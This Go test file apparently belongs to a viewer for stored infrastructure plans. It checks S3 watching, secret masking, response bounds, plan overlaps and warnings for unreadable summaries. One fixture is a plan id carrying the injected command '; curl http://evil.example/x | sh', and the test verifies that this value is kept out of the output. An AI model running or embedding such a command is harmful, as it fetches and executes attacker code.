	if want := []string{ben, ana}; !same(ids(l), want) {
		t.Fatalf("plans %v, want %v", ids(l), want)
	}
	if n := nodeOf(p.graph(), "services.a.db"); !same(n.Plans, []string{ben, ana}) || !n.Overlap {
		t.Errorf("the node: %v %v", n.Plans, n.Overlap)
	}
	secrets := append(allSecrets, "new-blob-value-9999", "new-map-secret-5555")
	noSecrets(t, "detail", p.get("/api/detail?addr=services.a.db&plan="+ana), secrets...)
	if o := p.overlay(ana); len(o.Nodes) != 2 || o.Plan.Status != "pending" {
		t.Errorf("overlay %+v", o)
	}
	if n := writes.Load(); n != 0 {
		t.Errorf("the viewer sent %d requests that write to the bucket", n)
	}
	armed.Store(false)
	// The progress object is replaced and keeps its key; the page is told.
	next := eventsOf(t, p)
	if err := engine.NewPlanStore(b).MarkApplied(context.Background(), ana, []string{"services.b.file"}, "txn-1", []string{"left"}); err != nil {
		t.Fatal(err)
	}
	waitFor(t, "the progress to show", func() bool { sp := planOf(p.plans(), ana); return sp != nil && sp.Status == "partial" })
	if ev, ok := next(time.Second); !ok || !contains(ev.What, "plans") {
		t.Errorf("event %+v %v", ev, ok)
	}
	for _, suffix := range []string{".progress.json", ".meta.json", ".plan.json"} {
		if err := b.Delete(context.Background(), "plans/"+ben+suffix); err != nil {
			t.Fatal(err)
		}
	}
	waitFor(t, "the collected plan to go", func() bool { return len(p.plans().Plans) == 1 })
}

// The watcher of a bucket reads only the progress objects of plans, and does not
// hold its lock while the bucket answers: a request for the revision is not kept
// waiting by a slow bucket.
func TestWatcherOfABucketDoesNotWaitOnIt(t *testing.T) {
	f := fakes3.New()
	var mu sync.Mutex
	reads := map[string]int{}
	hold := make(chan struct{})
	var holding atomic.Bool
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodGet && strings.HasSuffix(r.URL.Path, ".progress.json") {
			mu.Lock()
			reads[r.URL.Path[strings.LastIndex(r.URL.Path, "/")+1:]]++
			mu.Unlock()
			if holding.Load() {
				<-hold
			}
		}
		f.ServeHTTP(w, r)
	}))
	t.Cleanup(ts.Close)
	b, err := state.NewS3Backend(context.Background(), state.S3Config{Bucket: "state", Prefix: "team/app", Region: "us-east-1", Endpoint: ts.URL,
		PathStyle: true, AccessKey: "test", SecretKey: "test"})
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	ids := []string{"plan-aaaaaaaa", "plan-bbbbbbbb", "plan-cccccccc"}
	for _, id := range ids {
		if _, err := b.PutIfAbsent(ctx, "plans/"+id+".progress.json", []byte("{}")); err != nil {
			t.Fatal(err)
		}
	}
	// Objects under plans/ that are not the progress of a plan are listed and not read.
	for _, key := range []string{"plans/other.progress.json", "plans/plan-zz.progress.json", "plans/plan-aaaaaaaa.progress.json.bak"} {
		if _, err := b.PutIfAbsent(ctx, key, []byte("{}")); err != nil {
			t.Fatal(err)
		}
	}
	w := newWatcher(time.Hour, t.TempDir(), "")
	w.setState("", b)
	w.sample()
	mu.Lock()
	got := map[string]int{}
	for k, v := range reads {
		got[k] = v
	}
	mu.Unlock()
	if len(got) != len(ids) {
		t.Errorf("progress objects read: %v, want only the %d of plans", got, len(ids))
	}
	for _, id := range ids {
		if got[id+".progress.json"] != 1 {
			t.Errorf("%s read %d times, want once", id, got[id+".progress.json"])
		}
	}
	// The bucket is slow: a request for the revision is answered meanwhile.
	w.mu.Lock()
	w.remote = 0
	w.mu.Unlock()
	holding.Store(true)
	done := make(chan struct{})
	go func() { w.sample(); close(done) }()
	waitFor(t, "the watcher to ask the bucket", func() bool {
		mu.Lock()
		defer mu.Unlock()
		return reads["plan-aaaaaaaa.progress.json"] > 1
	})
	answered := make(chan struct{})
	go func() { w.revision(); close(answered) }()
	select {
	case <-answered:
	case <-time.After(2 * time.Second):
		t.Error("the revision waits for the bucket")
	}
	holding.Store(false)
	close(hold)
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Fatal("the sample did not end")
	}
}

const newSecret = "new-blob-value-9999" // the new value of blob in the plan of writePlan: the state does not hold it

// The values that a stored plan would write are secrets for everything that is
// said about that plan, as for a plan file: a record of the state and a line of
// the source that embed one are withheld when the plan is named, though the state
// does not hold the value yet.
func TestStoredPlanNewSecretsMaskEveryResponse(t *testing.T) {
	p := newProject(t)
	id := storePlan(t, p, stored{Author: "ana@acme", Addrs: []string{"services.a.db", "services.b.file"}})
	// A record that embeds the value in an attribute that is not sensitive, as a plan applied in part leaves.
	r := *p.store.Get("shared")
	r.Attributes = json.RawMessage(`{"name":"dsn=` + newSecret + `","port":5432}`)
	if err := p.store.Set(&r, ""); err != nil {
		t.Fatal(err)
	}
	// A line of the specification that embeds it.
	writeSpec(t, p.dir, specCUE+"\nfreshfile: $fake.#Resource.fake_file & {path: \"/tmp/f\", content: \"dsn="+newSecret+"\"}\n")
	waitFor(t, "the new node and the record", func() bool {
		return nodeOf(p.graph(), "freshfile") != nil && len(p.plans().Plans) == 1 && planOf(p.plans(), id).Status == "pending"
	})
	for _, path := range []string{"/api/detail?addr=shared", "/api/source?addr=freshfile"} {
		if !strings.Contains(string(p.get(path)), newSecret) {
			t.Fatalf("%s without a plan does not show the value: the test proves nothing", path)
		}
		noSecrets(t, path+"&plan=ID", p.get(path+"&plan="+id), newSecret)
	}
	noSecrets(t, "the overlay", p.get("/api/plan?id="+id), newSecret)
}

// The author, the reasons of a stale plan and the hints that an overlay sends are
// masked against the secrets of that plan, in the overlay and in the graph of a
// server started with the plan.
func TestStoredPlanInfoIsMasked(t *testing.T) {
	dir := t.TempDir()
	writeSpec(t, dir, specCUE)
	st, _ := state.Open(filepath.Join(dir, "pravo.state"))
	seed(t, st)
	holder := &project{t: t, dir: dir, store: st}
	id := storePlan(t, holder, stored{Author: "ana " + secretToken, Addrs: []string{"services.a.db"}})
	for name, opts := range map[string]Options{"overlay": {}, "graph": {PlanID: id}} {
		p := start(t, dir, st, opts)
		var raw []byte
		if name == "overlay" {
			raw = p.get("/api/plan?id=" + id)
		} else {
			raw = p.get("/api/graph")
		}
		noSecrets(t, name, raw, secretToken)
		if !strings.Contains(string(raw), `"actor":"ana `) {
			t.Errorf("%s: the actor is not there: %s", name, raw)
		}
	}
	// The reasons and the hints are bounded and masked with the secrets of the plan.
	p := newProject(t)
	m, err := p.srv.current()
	if err != nil {
		t.Fatal(err)
	}
	sec := m.secrets.clone()
	sec.add("plan-only-secret-77")
	var reasons []string
	for i := 0; i < maxReasons+5; i++ {
		reasons = append(reasons, "reason plan-only-secret-77 "+strings.Repeat("x", 2*maxReason))
	}
	po := &planOverlay{secrets: sec, info: PlanInfo{Actor: "a plan-only-secret-77", Reasons: reasons, Hints: []string{"hint plan-only-secret-77"}}}
	info := m.cleanInfo(po)
	data, _ := json.Marshal(info)
	if strings.Contains(string(data), "plan-only-secret-77") || len(info.Reasons) != maxReasons+1 || !strings.HasPrefix(info.Reasons[maxReasons], "and 5 more") {
		t.Errorf("info %s", data)
	}
	for _, r := range info.Reasons[:maxReasons] {
		if len([]rune(r)) > maxReason+1 {
			t.Errorf("a reason of %d characters", len([]rune(r)))
		}
	}
}

// The text that the author wrote with a plan is in the overlay and not in the
// listing, and the overlay masks it against the values the plan writes.
func TestStoredPlanFreeTextIsOnlyInTheOverlay(t *testing.T) {
	p := newProject(t)
	id := storePlan(t, p, stored{Author: "ana@acme", Reason: "rotate to " + newSecret, Git: "rev-" + newSecret, Command: "pravo plan --store --note " + newSecret,
		Addrs: []string{"services.a.db"}})
	waitFor(t, "the plan", func() bool { return len(p.plans().Plans) == 1 })
	list := string(p.get("/api/plans"))
	for _, text := range []string{newSecret, "rotate to", "rev-", "--note"} {
		if strings.Contains(list, text) {
			t.Errorf("the listing carries %q", text)
		}
	}
	o := p.overlay(id)
	if !strings.HasPrefix(o.Reason, "rotate to ") || strings.Contains(o.Reason, newSecret) || strings.Contains(o.GitRevision, newSecret) || strings.Contains(o.Command, newSecret) {
		t.Errorf("overlay text: %q %q %q", o.Reason, o.GitRevision, o.Command)
	}
	// Text of any length is bounded.
	long := strings.Repeat("y", 5*maxText)
	if got := maskText(newSecretSet(), long, maxText); len([]rune(got)) > maxText+1 {
		t.Errorf("a text of %d characters", len([]rune(got)))
	}
	if got := maskCommand(newSecretSet(), "pravo plan "+long, maxText); len([]rune(got)) > maxText+1 {
		t.Errorf("a command of %d characters", len([]rune(got)))
	}
}

// A plan that applied its change on a node has nothing left to do there: it is not
// on the node and does not overlap another plan that changes it. A summary that
// lists an address more than once puts its plan on the node once. The overlap of
// two plans is the same seen from either.
func TestPartialPlanIsNotOnItsAppliedNodes(t *testing.T) {
	p := newProject(t)
	ana := storePlan(t, p, stored{Author: "ana@acme", Created: time.Now().Add(-2 * time.Hour), Addrs: []string{"services.a.db", "services.b.file"}, Dup: "services.b.file"})
	if err := engine.NewPlanStore(p.store.Backend()).MarkApplied(context.Background(), ana, []string{"services.a.db"}, "txn-1", []string{"services.a.db", "services.b.file"}); err != nil {
		t.Fatal(err)
	}
	ben := storePlan(t, p, stored{Author: "ben@acme", Created: time.Now().Add(-time.Hour), Addrs: []string{"services.a.db", "hosts.x"}})
	waitFor(t, "both plans", func() bool { l := p.plans(); return len(l.Plans) == 2 && planOf(l, ana).Status == "partial" })
	g := p.graph()
	for addr, want := range map[string][]string{"services.a.db": {ben}, "services.b.file": {ana}, "hosts.x": {ben}} {
		if n := nodeOf(g, addr); !same(n.Plans, want) || n.Overlap {
			t.Errorf("%s: plans %v overlap %v, want %v and no overlap", addr, n.Plans, n.Overlap, want)
		}
	}
	l := p.plans()
	a, b := planOf(l, ana), planOf(l, ben)
	if len(a.Overlaps) != 0 || len(b.Overlaps) != 0 {
		t.Errorf("overlaps: ana %+v, ben %+v", a.Overlaps, b.Overlaps)
	}
	if a.Applied != 1 || !a.Touches[0].Applied || a.Touches[1].Applied {
		t.Errorf("ana: applied %d, touches %+v", a.Applied, a.Touches)
	}
	// A third plan changes the address that ana still has a change on: both see it.
	cy := storePlan(t, p, stored{Author: "cy@acme", Addrs: []string{"services.b.file"}})
	waitFor(t, "the third plan", func() bool { return len(p.plans().Plans) == 3 })
	l = p.plans()
	a, c := planOf(l, ana), planOf(l, cy)
	if len(a.Overlaps) != 1 || a.Overlaps[0].ID != cy || len(c.Overlaps) != 1 || c.Overlaps[0].ID != ana || !same(a.Overlaps[0].Addrs, c.Overlaps[0].Addrs) {
		t.Errorf("overlaps: ana %+v, cy %+v", a.Overlaps, c.Overlaps)
	}
	if n := nodeOf(p.graph(), "services.b.file"); !same(n.Plans, []string{cy, ana}) || !n.Overlap {
		t.Errorf("services.b.file: %v %v", n.Plans, n.Overlap)
	}
}

// What a listing sends is bounded: the reasons, the addresses of an overlap and the
// text; and it is worked out once for a revision of the model.
func TestStoredListIsBoundedAndWorkedOutOnce(t *testing.T) {
	p := newProject(t)
	var addrs []string
	for i := 0; i < 100; i++ {
		addrs = append(addrs, fmt.Sprintf("big.r%03d", i))
	}
	put := func(author string, created time.Time) string {
		meta := &engine.PlanMeta{Format: engine.PlanMetaFormat, Created: created, Expires: created.Add(time.Hour * 24), Author: author, Lineage: p.store.Lineage(), Bases: map[string]engine.PlanBase{}}
		for _, a := range addrs {
			meta.Changes = append(meta.Changes, engine.PlanTouch{Addr: a, Action: engine.ActionCreate})
		}
		doc, _ := json.Marshal(map[string]any{"format": 1, "created": created, "lineage": p.store.Lineage(), "author": author, "providers": map[string]string{}, "changes": []any{}})
		if err := engine.NewPlanStore(p.store.Backend()).Put(context.Background(), doc, meta); err != nil {
			t.Fatal(err)
		}
		return meta.ID
	}
	a := put(strings.Repeat("a", 5*maxText), time.Now().Add(-time.Hour))
	b := put("ben", time.Now())
	waitFor(t, "the plans", func() bool { return len(p.plans().Plans) == 2 })
	l := p.plans()
	pa, pb := planOf(l, a), planOf(l, b)
	if len([]rune(pa.Author)) > maxText+1 {
		t.Errorf("an author of %d characters", len([]rune(pa.Author)))
	}
	if len(pa.Overlaps) != 1 || pa.Overlaps[0].Count != 100 || len(pa.Overlaps[0].Addrs) != maxOverlapAddrs || pa.Overlaps[0].Truncated != 100-maxOverlapAddrs ||
		pa.Overlaps[0].Addrs[0] != "big.r000" || len(pb.Overlaps) != 1 || pb.Overlaps[0].Count != 100 || pb.Overlaps[0].ID != a {
		t.Errorf("overlaps: %+v / %+v", pa.Overlaps, pb.Overlaps)
	}
	m, err := p.srv.current()
	if err != nil {
		t.Fatal(err)
	}
	if m.planList() != m.planList() {
		t.Error("the list is worked out again")
	}
}

// A plan that cannot be read is told in a warning, not dropped without a word; and
// a summary that names another plan is not trusted for the id of one.
func TestUnreadableStoredPlansAreWarnedAbout(t *testing.T) {
	p := newProject(t)
	good := storePlan(t, p, stored{Author: "ana@acme", Addrs: []string{"services.a.db"}})
	torn := storePlan(t, p, stored{Author: "ben@acme", Addrs: []string{"hosts.x"}})
	if err := p.store.Backend().Put(context.Background(), "plans/"+torn+".progress.json", []byte(`{"applied": {`)); err != nil {
		t.Fatal(err)
	}
	// A summary whose id is not its key's: the id would end in a command that a person copies.
	evil := "plan-bbbbbbbb"
	meta, _ := json.Marshal(map[string]any{"format": 1, "id": evil + "; curl http://evil.example/x | sh #", "author": "eve", "created": time.Now(), "expires": time.Now().Add(time.Hour), "lineage": "x", "changes": []any{}})
	for _, kind := range []string{".plan.json", ".meta.json"} {
		data := []byte(`{"format":1,"providers":{},"changes":[]}`)
		if kind == ".meta.json" {
			data = meta
		}
		if _, err := p.store.Backend().PutIfAbsent(context.Background(), "plans/"+evil+kind, data); err != nil {
			t.Fatal(err)
		}
	}
	waitFor(t, "the warning", func() bool {
		for _, w := range p.graph().Warnings {
			if strings.Contains(w, torn) {
				return true
			}
		}
		return false
	})
	l := p.plans()
	if len(l.Plans) != 1 || l.Plans[0].ID != good {
		t.Errorf("listed %v, want only %s", ids(l), good)
	}
	var warning string
	for _, w := range p.graph().Warnings {
		if strings.Contains(w, "cannot be read") {
			warning = w
		}
	}
	if !strings.Contains(warning, torn) || !strings.Contains(warning, evil) || strings.Contains(warning, "curl") {
		t.Errorf("warning %q", warning)
	}
	if strings.Contains(string(p.get("/api/plans")), "curl") || strings.Contains(string(p.get("/api/graph")), "curl") {
		t.Error("the hostile id was sent")
	}
}

// A summary that is far larger than a summary can be is refused, the plan is listed
// as one that cannot be read and the other plans are not affected. The summary is
// written once, so it is read once: what the viewer saw of it is kept for the
// rebuilds that follow, and forgotten with the plan.
func TestHostileSummaryIsRefusedAndReadOnce(t *testing.T) {
	p := newProject(t)
	good := storePlan(t, p, stored{Author: "ana@acme", Addrs: []string{"services.a.db"}})
	victim := storePlan(t, p, stored{Author: "ben@acme", Addrs: []string{"hosts.x"}})
	key := "plans/" + victim + ".meta.json"
	hostile := `{"format":1,"id":"` + victim + `","author":"` + strings.Repeat("x", 20<<20) + `"}`
	if err := p.store.Backend().Put(context.Background(), key, []byte(hostile)); err != nil {
		t.Fatal(err)
	}
	waitFor(t, "the warning", func() bool {
		for _, w := range p.graph().Warnings {
			if strings.Contains(w, victim) && strings.Contains(w, "too large") {
				return true
			}
		}
		return false
	})
	if l := p.plans(); len(l.Plans) != 1 || l.Plans[0].ID != good {
		t.Errorf("listed %v, want only %s", ids(l), good)
	}
	// Rebuilds: the summary of the good plan is not read again, nor is the refused one.
	if n := p.srv.planMeta.Len(); n != 2 {
		t.Errorf("the cache holds %d summaries, want 2", n)
	}
	if err := p.store.Backend().Put(context.Background(), key, []byte(`{"format":1,"id":"`+victim+`","author":"ok"}`)); err != nil {
		t.Fatal(err)
	}
	r := *p.store.Get("shared")
	r.Attributes = json.RawMessage(`{"name":"moved","port":5432}`)
	if err := p.store.Set(&r, ""); err != nil {
		t.Fatal(err)
	}
	waitFor(t, "a rebuild", func() bool { return strings.Contains(string(p.get("/api/detail?addr=shared")), "moved") })
	if l := p.plans(); len(l.Plans) != 1 || l.Plans[0].ID != good {
		t.Errorf("after a rebuild, listed %v: the refused summary was read again", ids(l))
	}
	// The plan is collected: the cache forgets it.
	for _, k := range []string{".progress.json", ".meta.json", ".plan.json"} {
		p.store.Backend().Delete(context.Background(), "plans/"+victim+k)
	}
	waitFor(t, "the cache to forget", func() bool { p.plans(); return p.srv.planMeta.Len() == 1 })
}

// A plan that a collector claimed is hidden, and it shows again when the claim
// lapses, without anything being written: the server schedules that moment as it
// does an expiry, and sends one plans event.
func TestLapsingCollectorClaimIsPickedUpLive(t *testing.T) {
	p := newProject(t)
	id := storePlan(t, p, stored{Author: "ana@acme", Addrs: []string{"services.a.db"}})
	at := time.Now().Add(-10*time.Minute + 2*time.Second)
	claim, _ := json.Marshal(map[string]any{"format": 1, "id": id, "collecting": map[string]any{"by": "gc", "at": at}, "updated": at})
	waitFor(t, "the plan", func() bool { return len(p.plans().Plans) == 1 })
	next := eventsOf(t, p)
	if err := p.store.Backend().Put(context.Background(), "plans/"+id+".progress.json", claim); err != nil {
		t.Fatal(err)
	}
	waitFor(t, "the plan to be hidden", func() bool { return len(p.plans().Plans) == 0 })
	deadline := time.Now().Add(8 * time.Second)
	for len(p.plans().Plans) == 0 {
		if time.Now().After(deadline) {
			t.Fatal("the plan did not show again when the claim lapsed")
		}
		time.Sleep(50 * time.Millisecond)
	}
	for {
		ev, ok := next(time.Second)
		if !ok {
			t.Fatal("no plans event")
		}
		if contains(ev.What, "plans") && len(p.plans().Plans) == 1 {
			break
		}
	}
}
